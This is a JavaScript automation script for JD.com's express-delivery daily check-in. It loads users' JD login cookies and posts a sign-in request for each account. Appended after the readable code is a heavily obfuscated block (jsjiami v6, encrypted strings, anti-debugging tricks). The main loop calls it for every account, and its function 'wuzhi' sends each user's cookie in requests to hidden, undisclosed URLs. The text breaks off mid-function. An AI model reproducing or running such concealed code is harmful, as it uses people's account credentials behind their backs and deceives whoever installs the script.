/*
京东快递签到
活动入口：https://jingcai-h5.jd.com/#/
签到领豆,14天内满4次和7次享额外奖励，每天运行一次即可
更新地址：https://gitee.com/lxk0301/jd_scripts/raw/master/jd_kd.js

已支持IOS双京东账号, Node.js支持N个京东账号
脚本兼容: QuantumultX, Surge, Loon, 小火箭，JSBox, Node.js
============Quantumultx===============
[task_local]
#京东快递签到
10 0 * * * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_kd.js, tag=京东快递签到, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jd_kd.png, enabled=true

================Loon==============
[Script]
cron "10 0 * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_kd.js, tag=京东快递签到

===============Surge=================
京东快递签到 = type=cron,cronexp="10 0 * * *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_kd.js

============小火箭=========
京东快递签到 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_kd.js, cronexpr="10 0 * * *", timeout=3600, enable=true
 */
const $ = new Env('京东快递签到');

const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let jdNotify = true;//是否关闭通知，false打开通知推送，true关闭通知推送
const randomCount = $.isNode() ? 20 : 5;
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', message;
let t = +new Date()
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
} else {
  let cookiesData = $.getdata('CookiesJD') || "[]";
  cookiesData = jsonParse(cookiesData);
  cookiesArr = cookiesData.map(item => item.cookie);
  cookiesArr.reverse();
  cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
  cookiesArr.reverse();
  cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
}
const JD_API_HOST = 'https://api.m.jd.com/api';
!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await userSignIn();
      await shuye72();
      await showMsg();
    }
  }
})()
    .catch((e) => {
      $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
      $.done();
    })

function showMsg() {
  return new Promise(resolve => {
    $.msg($.name, '', `【京东账号${$.index}】${$.nickName}\n${message}`);
    resolve()
  })
}
function userSignIn() {
  return new Promise(resolve => {
    $.post(taskUrl(), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(resp)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 1) {
              console.log(`今日签到成功，获得${data.content[0].title}`)
              message += `今日签到成功，获得${data.content[0].title} 🐶\n`;

            } else if (data.code === -1) {
              console.log(`今日已签到`)
              message += `【签到】失败，今日已签到`;
            } else {
              console.log(`异常：${JSON.stringify(data)}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function taskUrl() {
  return {
    url: `https://lop-proxy.jd.com/jiFenApi/signInAndGetReward`,
    body: '[{"userNo":"$cooMrdGatewayUid$"}]',
    headers: {
      'Host': 'lop-proxy.jd.com',
      'lop-dn': 'jingcai.jd.com',
      'biz-type': 'service-monitor',
      'app-key': 'jexpress',
      'access': 'H5',
      'content-type': 'application/json;charset=utf-8',
      'clientinfo': '{"appName":"jingcai","client":"m"}',
      'accept': 'application/json, text/plain, */*',
      'jexpress-report-time': '1607330170578',
      'x-requested-with': 'XMLHttpRequest',
      'source-client': '2',
      'appparams': '{"appid":158,"ticket_type":"m"}',
      'version': '1.0.0',
      'origin': 'https://jingcai-h5.jd.com',
      'sec-fetch-site': 'same-site',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://jingcai-h5.jd.com/',
      'accept-language': 'zh-CN,zh;q=0.9',
      "Cookie": cookie,
      "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
    }
  }
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xod4='jsjiami.com.v6',_0x4870=[_0xod4,'wqwcKMOUHA==','w43DucKZLsOp','w5XDuMOIwojClA==','w5F7Kg==','w51LABNJ','wrEmZcKFDg==','GMK5GE7Dng==','w5zDosKPwqvClg==','BcKqYMOJHw==','wrXChcKo','dsKRw5ID','dlERwpPorZDmsrvlpr/ot6XvvLHorInmoKnmnLvnv63otJfph7norqo=','ECEw','wr93cjg=','OHzCmUDorKbmsZblpLfotpXvvqHor7rmoq3mnbXnvJjotIHph7vor4s=','wrHCqTjCkTo=','FcO7wqBhwpXDlMO6','wqPDgcK1wqgo','fsOZw4DDgkk=','TMOzw5TDuUTDt8Or','M8OPf8Ovw4BC','w7EQAMOSXA==','fFzCvWjClnFy','w4gzJBnDrhw=','SW7CpGzCuA==','OHIXwrXDlQ==','w4HChsOcw5Ue','w4A3Ph/DnRFB','w4LDp2fDlg==','eMOiw5nDoG4=','w4g5LTvDqAY=','M8OFdsONw4ZY','MsORLEkj','YcOdw4vDu1A=','wocbYsKeLA==','Myw9wogv','w5BJcXvCvA==','wrnCt8KPwr4l','w4otUMK2w5c=','wpoDfHrDkQ==','K3kOOcKf','w5bDksOcwobClg==','GV7Ct8KaBA==','wrnDjx7CrMOJwoMpRE1gTQk=','w6ARw78fw5RbEgk7w7Uzwp4dFBEqw4twOg==','JHQyOcO7woLDm27DjH8=','w5duLsOGwqgHL8OSGxUfwrcPNcKOECEOwrsKw4rDs8ODw6rDm8KywrjCjQvDnMORw6rCjg==','w6jClcOZw6wBTl0IcBwaQ3UCAcOOw41TADtifUjDi8KDdlMjw4M4NXrDox7ClWLDsWsyDBLCu23DuELCsRgiRcO8KMObVhFdwrUtw6ATw6VZOMODfsO+EsOcwowEPMK+MsKsQQLCrcKTbWxdwoEgwpLCgVfDpMOWwpMGwqEPw53CusO8agRbHjnCrcOzLh0gw7XDslDDhMK/GTkBw5LDkQoFB8OmdsKUBkVaIDwDwpjCmMKIwpQ6XDpqwpLCmU3CgjXDiHJ2wooHwrNEw63Ds1TDgsK0W1cREgTCiMOEXMKGw5PDicK0Emdyw67CkEbCsMKRw4FLw6/DoEZdGMOVAnnCjsKAKsKbw7hQIUvCi8KHw4tsw7cewpB8cVPDqMOMw7nCmcOhwrrDg8KzP8Otw60fw6vCk8KHFMONZMKmFsOwwq/Dk8OaMhBqw6liN8O6OsK5wpTCiCXCpjdWw716w5dhFsO0wpl/A8OmwqfDgcODw7/DucOGZcOOwqbDrCJMwpDDrlvDlzQgwoV3f8KKw5jCjsKqYSjChXhoOB0zw4sDwokIZWIyfcKFH8OJQzIBwpjCh3lbFMOQwrgJw6NIw5LDuMOLwrYHc3LDl0XCqS7Cs0fCmG5tYiEBc1gTw7FrCMOnD8KZdzrCrsOsw6RBwpvCii/Cn1rDg8KtH0NowpvCr8K1w4sgZn3Cl8OawqfDmcOWwqk=','wrUhFlHDrQ==','w4jDrMKLHsO8w7E/wowxw64=','M8OdwohROsKYwpQYw6kX','w5dtLcODwrIQB8OC','wrDDiwPDssOXwpdsDwJzS0rCoRfDi1EFCsK9B8KdOMOnVsKITkTCgsO7ZMOyfMOvw4Upw6kEwoTDnsKRw4DDkVdgdcONZlZVUijDucK+AGvCtkjCnsKmwq5DNcO9w4IawpcTIcO/dzQxw63Dk8KmwoPDiMKqwpHDt07DrSUXJFpKwrNzwprDoMOQw7LCr8Onwoc2w5XCo8KmwobDrcK6ZQsbw7BwaFlhGTbDv1bCrkkawojCgD9oXX/DtSXDvHwQw6ksdXbCg8OiBsKZbnwFw5g+LAXCoxXDjMO5wplSPEhdP8O5wpDCt8Kdw4gTWXcwKGdTKygRHUZXbMOAwrxnw6HCnQvDucKVwrN2wr3Dp8OIwr7Cg8KnwrPDq1TDu8Ofw4QKEU9BQMKNwoPDoMOTwoXCmArDmcOqCcOaGcKmQirCizvClSbCqsKyBMOlwqJPw6HCj2xRwow4wrTCgRUFw6ofXMKnAA==','woHCucKvw7fDt1/CvHHCpnlNwpbDmivDlsKgwoROVWXDhDoIBXvDjQ==','PQ/DuyzDplAm','w5N1GhNG','VB5zwo91','woHDhjHDrMOR','wqRATMOpwo0=','NXQkJsKs','w4wiPg7DqU4aw7JBw6jChUVZw5bClh7DjcOmwoICw503wr5twrrDjsOjw6XDgMOCfmjCvhzDksOBw7BQw6g4wpnDmMOcwq/Cr1VKwqnDu8OIZF0RZsOfasOmw4zCuMOIMMKtGkkJDi/CjRbCoT/DtB8aw507EcOGwq3Ck8KjwrQkYsOl','w7XDgcK0wqgkCxvCisKrw7I=','w5ICXcKBfnrDmRdwQMOwwqbDuCI/wrvCq3DDmnUjwqQOGCsHwrFJwocbwq0XwonCkkrDmFrDgsKlw5PDoxjCs8Kjw6/DoQLCvwLDpcOgwqjDg8KWOsOdw5zChV7DsAI+IcK1w5LDk0rDicKVD8K+w48iS8KbUBHDjsOAMMOWfMKywpnDnCxdZsKCZcKudcKz','KcKkwpPCv8Ka','wqzDsMOkGTA=','Pg02emY=','OGQbE8Ks','IcKEWMO7Kw==','w5vDpcKSG8On','dnbCmGjCsA==','w40HOBjDlw==','RcO+wqNgVQ==','QsO8wplJfw==','WMKLdcOhMw==','w6trwrPCl3c=','M8OSwp5IBg==','eF05wrfDhg==','V8K+w7MkNw==','A8OOwqN6wqs=','w4HDuMKcwr3CvA==','wrfDqsOvGDk=','VHTCk03Cmw==','wobCtMKe','BcOBG0Eg','EHMqwqLDqw==','dMKdw70TEA==','B8OxIWAU','DDwfV3E=','wolTW8OFwqU=','J8KKITkB','wr15eA==','X8OWwp1g','LgVtwpfor6/msa7lpbLotoXvvbjorrDmoKDmnq3nvb3otKjph5rorKs=','PWXDmyzCuQ==','w7YydsKWw5s=','w77Do8KQNcOb','wr/Dj8Kg','w5fCiRLDpQ==','w7PDocKXwpLorrrmsLrlpZ7ot6bvv4PorLjmo7zmn4Hnv6fotYLphb7orbg=','w7gEw7kcw4I=','w7ggG8OgYQ==','QsO8w4/DrGo=','I8O+wpZ6wps=','wr8oSUHDpg==','GsKRVQ==','w6zCkMOVw7k=','w4tfw5Yi6K2q5rKD5aeV6LaJ77646KyN5qOz5p2K57+O6Lei6YSf6KyD','AsOTwp5gw44=','csO1wqNCXw==','w5vDgMKOwqLCsw==','NsK2wrfCssKE','w4XDoMKYMsO4w6o=','ECEwwq4WMQ==','wqtjUQVK','woJrw6QFw74=','CsOUwplRPQ==','w51Jf2HCiw==','OMOJwrVgOg==','XWzChGLCgQ==','GcOuwqBwwqHCi8KhIgXDhiQIwo9qSkDDnj5EwpTDucOfwpMJS0nCnD/CucKVIXY3wqwxwoNZw6dsAsKmwoLDhgfDoMKywobCtTHCtsKxBcK1wo7DmcO4chrCoMODfAHDlsOuwo7CvMKSw7Ysw5wBCQAAUD8=','P8OdwpZ6w4dOw5nDhjIaw5VGLVDCn8Kew4Fow70eAlbCn0REw7YILyIMJcODwr/DhVnChsOXUMOxwq3DuMKzwoNCw6wIbcOow57CiR3DoRwCwrN4ZBbCvUpqLGTCs0zDrcOAf25twr7Dn3vDvsKXw7AESCswEGTCrCzDv0HDujd/w5kGIB5sacOeGsKdw4V7FcKQwqDDjMOqw6XCsUvCosOMVxTDmCwSJj1qHEldECx6aWnClsKaDHLDt8OIwrNEBsKYw4zCk8O/eUPCjG/CtMO4fsOmecOoGMOkKcOmLcKwwqc=','w4jDrMOrwr/CrA==','wrATCELDmg==','w4jDg8KNNsOu','w7kfw6Yrw4U=','elwMwrbDpw==','Gx4mTmA=','w7rDjMK7wpXClg==','jwsjiamYi.cXohmID.NCvL6uWbyF=='];(function(_0x54daff,_0x5614d3,_0x4e8f06){var _0x10d00b=function(_0x5b9dd8,_0x20f70d,_0x279f58,_0x2550fc,_0xb2f8ba){_0x20f70d=_0x20f70d>>0x8,_0xb2f8ba='po';var _0x43e38c='shift',_0x3c806f='push';if(_0x20f70d<_0x5b9dd8){while(--_0x5b9dd8){_0x2550fc=_0x54daff[_0x43e38c]();if(_0x20f70d===_0x5b9dd8){_0x20f70d=_0x2550fc;_0x279f58=_0x54daff[_0xb2f8ba+'p']();}else if(_0x20f70d&&_0x279f58['replace'](/[wYXhIDNCLuWbyF=]/g,'')===_0x20f70d){_0x54daff[_0x3c806f](_0x2550fc);}}_0x54daff[_0x3c806f](_0x54daff[_0x43e38c]());}return 0x7c90c;};var _0x368bbe=function(){var _0x2caf5b={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x3f1945,_0x3dbd16,_0x5edc70,_0xe693c4){_0xe693c4=_0xe693c4||{};var _0x1048b0=_0x3dbd16+'='+_0x5edc70;var _0x232e80=0x0;for(var _0x232e80=0x0,_0x5bff0f=_0x3f1945['length'];_0x232e80<_0x5bff0f;_0x232e80++){var _0x2dc7b6=_0x3f1945[_0x232e80];_0x1048b0+=';\x20'+_0x2dc7b6;var _0x4c365f=_0x3f1945[_0x2dc7b6];_0x3f1945['push'](_0x4c365f);_0x5bff0f=_0x3f1945['length'];if(_0x4c365f!==!![]){_0x1048b0+='='+_0x4c365f;}}_0xe693c4['cookie']=_0x1048b0;},'removeCookie':function(){return'dev';},'getCookie':function(_0x5f2c84,_0x4d70f2){_0x5f2c84=_0x5f2c84||function(_0x2271ee){return _0x2271ee;};var _0x55ab32=_0x5f2c84(new RegExp('(?:^|;\x20)'+_0x4d70f2['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x446f01=typeof _0xod4=='undefined'?'undefined':_0xod4,_0x3fb7c3=_0x446f01['split'](''),_0x27f3f1=_0x3fb7c3['length'],_0x1d952f=_0x27f3f1-0xe,_0x1fab22;while(_0x1fab22=_0x3fb7c3['pop']()){_0x27f3f1&&(_0x1d952f+=_0x1fab22['charCodeAt']());}var _0x5dd71b=function(_0xbee871,_0x336ddb,_0x231c0e){_0xbee871(++_0x336ddb,_0x231c0e);};_0x1d952f^-_0x27f3f1===-0x524&&(_0x1fab22=_0x1d952f)&&_0x5dd71b(_0x10d00b,_0x5614d3,_0x4e8f06);return _0x1fab22>>0x2===0x14b&&_0x55ab32?decodeURIComponent(_0x55ab32[0x1]):undefined;}};var _0x168d7c=function(){var _0x3e1337=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x3e1337['test'](_0x2caf5b['removeCookie']['toString']());};_0x2caf5b['updateCookie']=_0x168d7c;var _0x2d9273='';var _0x1b10bd=_0x2caf5b['updateCookie']();if(!_0x1b10bd){_0x2caf5b['setCookie'](['*'],'counter',0x1);}else if(_0x1b10bd){_0x2d9273=_0x2caf5b['getCookie'](null,'counter');}else{_0x2caf5b['removeCookie']();}};_0x368bbe();}(_0x4870,0x1a1,0x1a100));var _0x4c30=function(_0x5176a1,_0x4a44a1){_0x5176a1=~~'0x'['concat'](_0x5176a1);var _0x314293=_0x4870[_0x5176a1];if(_0x4c30['RykhTT']===undefined){(function(){var _0x335c98;try{var _0x3b66ba=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x335c98=_0x3b66ba();}catch(_0x52f552){_0x335c98=window;}var _0x20124c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x335c98['atob']||(_0x335c98['atob']=function(_0x337dbf){var _0x228bf4=String(_0x337dbf)['replace'](/=+$/,'');for(var _0x37cf47=0x0,_0x4510a8,_0x22e2c2,_0x26359e=0x0,_0x258905='';_0x22e2c2=_0x228bf4['charAt'](_0x26359e++);~_0x22e2c2&&(_0x4510a8=_0x37cf47%0x4?_0x4510a8*0x40+_0x22e2c2:_0x22e2c2,_0x37cf47++%0x4)?_0x258905+=String['fromCharCode'](0xff&_0x4510a8>>(-0x2*_0x37cf47&0x6)):0x0){_0x22e2c2=_0x20124c['indexOf'](_0x22e2c2);}return _0x258905;});}());var _0x48ceb7=function(_0x4ab0c,_0x4a44a1){var _0x526e57=[],_0x258855=0x0,_0x32d0c4,_0x463ae6='',_0x3d2e06='';_0x4ab0c=atob(_0x4ab0c);for(var _0x286dc1=0x0,_0x582a6b=_0x4ab0c['length'];_0x286dc1<_0x582a6b;_0x286dc1++){_0x3d2e06+='%'+('00'+_0x4ab0c['charCodeAt'](_0x286dc1)['toString'](0x10))['slice'](-0x2);}_0x4ab0c=decodeURIComponent(_0x3d2e06);for(var _0x3d9f7f=0x0;_0x3d9f7f<0x100;_0x3d9f7f++){_0x526e57[_0x3d9f7f]=_0x3d9f7f;}for(_0x3d9f7f=0x0;_0x3d9f7f<0x100;_0x3d9f7f++){_0x258855=(_0x258855+_0x526e57[_0x3d9f7f]+_0x4a44a1['charCodeAt'](_0x3d9f7f%_0x4a44a1['length']))%0x100;_0x32d0c4=_0x526e57[_0x3d9f7f];_0x526e57[_0x3d9f7f]=_0x526e57[_0x258855];_0x526e57[_0x258855]=_0x32d0c4;}_0x3d9f7f=0x0;_0x258855=0x0;for(var _0x3be1b3=0x0;_0x3be1b3<_0x4ab0c['length'];_0x3be1b3++){_0x3d9f7f=(_0x3d9f7f+0x1)%0x100;_0x258855=(_0x258855+_0x526e57[_0x3d9f7f])%0x100;_0x32d0c4=_0x526e57[_0x3d9f7f];_0x526e57[_0x3d9f7f]=_0x526e57[_0x258855];_0x526e57[_0x258855]=_0x32d0c4;_0x463ae6+=String['fromCharCode'](_0x4ab0c['charCodeAt'](_0x3be1b3)^_0x526e57[(_0x526e57[_0x3d9f7f]+_0x526e57[_0x258855])%0x100]);}return _0x463ae6;};_0x4c30['odyOMT']=_0x48ceb7;_0x4c30['PBDfck']={};_0x4c30['RykhTT']=!![];}var _0x7e62d5=_0x4c30['PBDfck'][_0x5176a1];if(_0x7e62d5===undefined){if(_0x4c30['ArNaFL']===undefined){var _0x181f96=function(_0x5433c8){this['KHpWMr']=_0x5433c8;this['jnVGRU']=[0x1,0x0,0x0];this['EOZGHa']=function(){return'newState';};this['djcSAg']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['wjXTOX']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x181f96['prototype']['HgbNhq']=function(){var _0x4f1a18=new RegExp(this['djcSAg']+this['wjXTOX']);var _0x5066c1=_0x4f1a18['test'](this['EOZGHa']['toString']())?--this['jnVGRU'][0x1]:--this['jnVGRU'][0x0];return this['wFPqhW'](_0x5066c1);};_0x181f96['prototype']['wFPqhW']=function(_0xfdf238){if(!Boolean(~_0xfdf238)){return _0xfdf238;}return this['QrGVZY'](this['KHpWMr']);};_0x181f96['prototype']['QrGVZY']=function(_0x4cee97){for(var _0x13b03f=0x0,_0x79dbcc=this['jnVGRU']['length'];_0x13b03f<_0x79dbcc;_0x13b03f++){this['jnVGRU']['push'](Math['round'](Math['random']()));_0x79dbcc=this['jnVGRU']['length'];}return _0x4cee97(this['jnVGRU'][0x0]);};new _0x181f96(_0x4c30)['HgbNhq']();_0x4c30['ArNaFL']=!![];}_0x314293=_0x4c30['odyOMT'](_0x314293,_0x4a44a1);_0x4c30['PBDfck'][_0x5176a1]=_0x314293;}else{_0x314293=_0x7e62d5;}return _0x314293;};var _0x50f5c0=function(){var _0x237c41=!![];return function(_0x17333a,_0x5d64a4){var _0x3d3c80=_0x237c41?function(){if(_0x5d64a4){var _0x2c252f=_0x5d64a4['apply'](_0x17333a,arguments);_0x5d64a4=null;return _0x2c252f;}}:function(){};_0x237c41=![];return _0x3d3c80;};}();var _0xde271d=_0x50f5c0(this,function(){var _0x26911f=function(){return'\x64\x65\x76';},_0x42ef24=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x184980=function(){var _0x46dc73=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x46dc73['\x74\x65\x73\x74'](_0x26911f['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x8b552a=function(){var _0x166c1d=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x166c1d['\x74\x65\x73\x74'](_0x42ef24['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x128cbb=function(_0x483355){var _0x10337f=~-0x1>>0x1+0xff%0x0;if(_0x483355['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x10337f)){_0x5102fe(_0x483355);}};var _0x5102fe=function(_0x16a6ef){var _0x709334=~-0x4>>0x1+0xff%0x0;if(_0x16a6ef['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x709334){_0x128cbb(_0x16a6ef);}};if(!_0x184980()){if(!_0x8b552a()){_0x128cbb('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x128cbb('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x128cbb('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0xde271d();function wuzhi(_0x5d25dc){var _0x21fdcf={'LIZDJ':function(_0x2c6120){return _0x2c6120();},'tISeS':function(_0x36d8a6,_0x37ea84){return _0x36d8a6!==_0x37ea84;},'wuLZz':_0x4c30('0','N1yZ'),'WzjCw':_0x4c30('1','ZjBC'),'rjmlm':function(_0x578d35,_0x41243c){return _0x578d35===_0x41243c;},'nKQaa':_0x4c30('2','Rx]Y'),'iQrfM':_0x4c30('3','fZXM'),'sKiLy':_0x4c30('4','GTwA'),'dzmop':_0x4c30('5','qD]4'),'albpJ':_0x4c30('6','Q&y9'),'nfClH':_0x4c30('7','&N2H'),'ONLBe':_0x4c30('8','##cr'),'rTwzy':function(_0x52f1e3,_0x313e0f){return _0x52f1e3!==_0x313e0f;},'WSQEC':_0x4c30('9','fZNc'),'Csnox':_0x4c30('a','PGY$'),'ZZNQm':_0x4c30('b','W#qq'),'YyFnu':_0x4c30('c','&N2H'),'gDajj':_0x4c30('d','3sz5'),'zesoz':_0x4c30('e','o84Q'),'fFBbT':_0x4c30('f','Q&y9')};let _0x3122bd=_0x5d25dc[_0x4c30('10','TLVm')];let _0x3c8fc1=_0x5d25dc[_0x4c30('11','w7nz')][_0x4c30('12','3sz5')];let _0x110c00={'url':_0x4c30('13','PGY$')+_0x3122bd+_0x4c30('14','##cr')+_0x3c8fc1+_0x4c30('15','^&RO'),'headers':{'Host':_0x21fdcf[_0x4c30('16','WtXY')],'origin':_0x21fdcf[_0x4c30('17','20Lp')],'Cookie':cookie,'Connection':_0x21fdcf[_0x4c30('18','PGY$')],'Accept':_0x21fdcf[_0x4c30('19','dBjR')],'User-Agent':_0x21fdcf[_0x4c30('1a','&N2H')],'referer':_0x4c30('1b','1wL9')+_0x3122bd+_0x4c30('1c','ZayU')+_0x3c8fc1+_0x4c30('1d','ZjBC'),'Accept-Language':_0x21fdcf[_0x4c30('1e','OgwJ')]}};return new Promise(_0x48a3db=>{var _0x3b30e5={'zuNXP':function(_0x2fe98e){return _0x21fdcf[_0x4c30('1f','sl69')](_0x2fe98e);},'FckxL':function(_0x3d7001,_0x39fffb){return _0x21fdcf[_0x4c30('20','NXTx')](_0x3d7001,_0x39fffb);},'lmBuB':_0x21fdcf[_0x4c30('21','&N2H')],'xEtyd':_0x21fdcf[_0x4c30('22','$wy%')],'FxzHD':function(_0x20d163,_0x42c4ae){return _0x21fdcf[_0x4c30('23','TLVm')](_0x20d163,_0x42c4ae);},'JWvFB':_0x21fdcf[_0x4c30('24','^&RO')],'gmNBq':_0x21fdcf[_0x4c30('25','1wL9')],'LenQL':function(_0x5c484c,_0x3feb04){return _0x21fdcf[_0x4c30('26','5kN]')](_0x5c484c,_0x3feb04);},'ZKtGf':_0x21fdcf[_0x4c30('27','5kN]')],'WloBQ':_0x21fdcf[_0x4c30('28','B(7!')],'CBSGY':function(_0x1280d3,_0x5d7f0c){return _0x21fdcf[_0x4c30('29','jRH&')](_0x1280d3,_0x5d7f0c);},'RdBzI':_0x21fdcf[_0x4c30('2a','w7nz')],'MkCZL':_0x21fdcf[_0x4c30('2b',']g*6')],'yTfoJ':_0x21fdcf[_0x4c30('2c','BWUs')]};if(_0x21fdcf[_0x4c30('2d','0JIB')](_0x21fdcf[_0x4c30('2e','pDyU')],_0x21fdcf[_0x4c30('2f','sl69')])){_0x21fdcf[_0x4c30('30','^&RO')](_0x48a3db);}else{$[_0x4c30('31','GTwA')](_0x110c00,(_0xe43830,_0xbd63cc,_0x1bf3ab)=>{var _0x3b9136={'iubnc':function(_0x2a2985){return _0x3b30e5[_0x4c30('32','KSu5')](_0x2a2985);}};if(_0x3b30e5[_0x4c30('33','BWre')](_0x3b30e5[_0x4c30('34','BWUs')],_0x3b30e5[_0x4c30('35','KSu5')])){try{if(_0x3b30e5[_0x4c30('36','NXTx')](_0x3b30e5[_0x4c30('37','dBjR')],_0x3b30e5[_0x4c30('38','dv1v')])){console[_0x4c30('39','7Q]8')]($[_0x4c30('3a','5kN]')]+_0x4c30('3b','20Lp'));}else{if(_0xe43830){if(_0x3b30e5[_0x4c30('3c','ZQx6')](_0x3b30e5[_0x4c30('3d','qD]4')],_0x3b30e5[_0x4c30('3e','TLVm')])){console[_0x4c30('3f','ZayU')]($[_0x4c30('40','OVha')]+_0x4c30('41','ZayU'));}else{_0x1bf3ab=JSON[_0x4c30('42','W#qq')](_0x1bf3ab);}}else{if(_0x3b30e5[_0x4c30('43','*$7p')](_0x3b30e5[_0x4c30('44','bE&m')],_0x3b30e5[_0x4c30('45','0JIB')])){_0x1bf3ab=JSON[_0x4c30('46','Q&y9')](_0x1bf3ab);}else{if(_0xe43830){console[_0x4c30('47','$wy%')]($[_0x4c30('48','o84Q')]+_0x4c30('49','yZ[K'));}else{_0x1bf3ab=JSON[_0x4c30('4a','KTom')](_0x1bf3ab);}}}}}catch(_0x14528f){if(_0x3b30e5[_0x4c30('4b','5kN]')](_0x3b30e5[_0x4c30('4c','pDyU')],_0x3b30e5[_0x4c30('4d','OgwJ')])){$[_0x4c30('4e','TLVm')](_0x14528f);}else{$[_0x4c30('4f','Rx]Y')](_0x14528f);}}finally{_0x3b30e5[_0x4c30('50','7Q]8')](_0x48a3db);}}else{_0x3b9136[_0x4c30('51','yZ[K')](_0x48a3db);}});}});}function shuye72(){var _0xafc866={'lgvmi':function(_0x186503,_0xc10aef){return 